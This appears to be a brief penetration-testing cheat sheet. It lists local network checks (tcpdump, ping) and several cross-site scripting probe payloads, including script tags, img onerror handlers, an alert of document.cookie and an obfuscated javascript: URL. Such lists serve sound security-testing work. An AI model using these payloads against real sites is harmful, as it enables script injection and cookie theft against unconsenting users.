```
local:
tcpdump

ping <local ip>
```

```
<script>alert("TEST");</script>
```

### Dom XSS
```
<![CDATA[><img src onerror=alert(1)]]>
```

```
<b onmouseover=alert('Wufff!')>click me!</b>
```

```
`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`
```

```
`<IMG SRC=j&#X41vascript:alert('test2')>`
```